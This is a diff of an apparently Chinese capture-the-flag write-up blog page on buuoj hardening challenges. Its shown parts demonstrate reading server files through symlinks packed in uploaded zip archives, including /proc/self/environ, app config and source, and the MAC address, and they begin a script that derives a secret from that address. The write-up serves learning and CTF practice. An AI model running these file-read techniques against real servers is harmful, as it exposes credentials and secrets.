@@ -4,7 +4,7 @@
 <meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
 <title>AmiaaaZ's Site | buuoj加固题 Wp</title>
 <meta name=viewport content="width=device-width,minimum-scale=1">
-<meta name=generator content="Hugo 0.89.1">
+<meta name=generator content="Hugo 0.89.2">
 <meta name=ROBOTS content="INDEX, FOLLOW">
 <link href=/dist/app.css rel=stylesheet>
 <script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
@@ -105,9 +105,10 @@
 <h3 id=考点二--linux软链接文件读取zip压缩包>考点二 · linux软链接文件读取&zip压缩包</h3>
 <p>ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用<code>/proc/self/cwd</code>来指向当前进程的目录</p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ln -s /proc/self/cwd/flag/flag/.jpg qwe
-</code></pre></div><p>或者通过<code>/proc/self/environ</code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-><a href=/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8>/proc目录的妙用</a> | <a href=https://bbs.zkaq.cn/t/3639.html>LFItoRCE利用总结</a>，题->[网鼎杯 2020 白虎组]PicDown</p>
+</code></pre></div><p>或者通过<code>/proc/self/environ</code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-><a href=/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8>/proc目录的妙用</a> | <a href=https://bbs.zkaq.cn/t/3639.html>LFItoRCE利用总结</a>，题-><a href=https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown>[网鼎杯 2020 白虎组]PicDown</a></p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ln -s /proc/self/environ qwe
-</code></pre></div><p>而对于目录内文件的列举也是有方法的（参考-><a href=https://blog.csdn.net/keyball123/article/details/105169946>34C3 CTF Web题 extract0r Writeup</a></p>
+</code></pre></div><p>而对于目录内文件的列举也是有方法的，参见-><a href=https://blog.csdn.net/keyball123/article/details/105169946>34C3 CTF Web题 extract0r Writeup</a></p>
+<p>甚至也可以写入shell，参见-><a href=https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw>[深育杯 2021]Zipzip</a></p>
 <p>制作好的软链接通过zip打包</p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>zip -ry qwe.zip qwe
 </code></pre></div><p>更多题目中的应用可以参见-><a href=http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/>记录一道题的多种解法</a></p>
@@ -134,10 +135,10 @@
 
 <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;rm -rf exp&#39;</span><span style=color:#111>)</span>
 <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;rm -rf exp.zip&#39;</span><span style=color:#111>)</span>
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 /proc/self/environ
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 exp.py /proc/self/environ
 python3 exp.py /app/y0u_found_it.ini
-python3 /app/y0u_found_it/y0u_found_it_main.py
-python3 /sys/class/net/eth0/address
+python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
+python3 exp.py /sys/class/net/eth0/address
 </code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png alt=image-20211106234837193></p>
 <p>exp.py - 2 根据mac地址生成伪随机数</p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>uuid</span>
@@ -256,7 +257,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 1758 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 1786 words in this page.
 </div>
 </div>
 </div>
